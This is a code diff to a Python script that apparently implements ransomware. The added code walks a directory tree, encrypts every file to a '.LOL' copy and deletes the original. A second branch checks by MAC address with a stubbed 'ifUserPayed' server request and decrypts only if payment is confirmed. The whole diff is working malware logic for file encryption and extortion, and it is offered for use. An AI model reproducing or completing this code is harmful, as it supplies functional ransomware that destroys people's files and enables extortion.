@@ -67,44 +67,71 @@ mac = still_MAC_Address()
 print mac
 
 key_path = 'kiavetta.key'
+root_path = '.\Experiment'
 
 # se esiste chiavetta, chiedi al server se quell'utente con quel MAC address ha pagato: se si decritta se no Null
 # altrimenti, invia la Request con quel MAC address, fai generare al server la chiave, e attraverso Response
 # usala per crittare tutto
 
 if os.path.isfile(key_path):
-    # 1) Request "ifUserPayed(MACAddress)" if True return Key stored in DB
+    # 1) Request "ifUserPayed(MACAddress)"
     # 2) if True Decrypt everything
-    key = key_recuva(key_path)
+
+    # Create the Request
+    req = {"r": "ifUserPayed", "MAC": mac}
+    # Send the request...and store the response here
+    resp = True
+
+    if resp:
+        # key = db stored key...
+        key = key_recuva(key_path)
+
+        #for every file stored, decrypt everything
+        for root, dirs, files in os.walk(root_path):
+            for file in files:
+                print(os.path.join(root, file))
+                tmp_path = os.path.join(root, file)
+
+                if tmp_path.endswith(".LOL"):
+                    # Take the name file and the its extension
+                    name_file, ext = name_and_extension(tmp_path)
+
+                    # Open file as a string
+                    file_string = open_file(tmp_path)
+
+                    #Decrypt
+                    file_tmp = decrypt(key, file_string)
+
+                    #Create decrypted file
+                    write_file(root+"\\"+name_file, file_tmp)
+
+                    #Remove .LOL file
+                    remove_file(tmp_path)
+
+        #Remove kiavetta just for testing
+        remove_file(key_path)
+
+
 else:
     # 1) Request "newUser(MACAddress)" return Key
     # 2) crypt everything
+
+    # key = db stored key...
     key = key_generation(key_path)
 
+    # for every file stored, crypt everything
+    for root, dirs, files in os.walk(root_path):
+        for file in files:
+            print(os.path.join(root, file))
+            tmp_path = os.path.join(root, file)
 
+            # Open file as a string
+            file_string = open_file(tmp_path)
 
-#Name File
-path= 'photo.jpg.LOL'
+            # File Encryption
+            file_tmp = crypt(key, file_string)
 
-#Open file as a string
-file_string = open_file(path)
-
-#Take the name file and the its extension
-name_file, ext = name_and_extension(path)
-
-if ext == '.LOL':
-    # File Decryption
-    file_tmp = decrypt(key, file_string)
-    # Create a file without .LOL extension
-    write_file(name_file, file_tmp)
-    remove_file(key_path)
-else:
-    # File Encryption
-    file_tmp = crypt(key, file_string)
-    # Create a file with .LOL extension
-    write_file(name_file+ext+".LOL", file_tmp)
-
-remove_file(path)
-
-
+            # Create a file with .LOL extension
+            write_file(tmp_path + ".LOL", file_tmp)
+            remove_file(tmp_path)
 
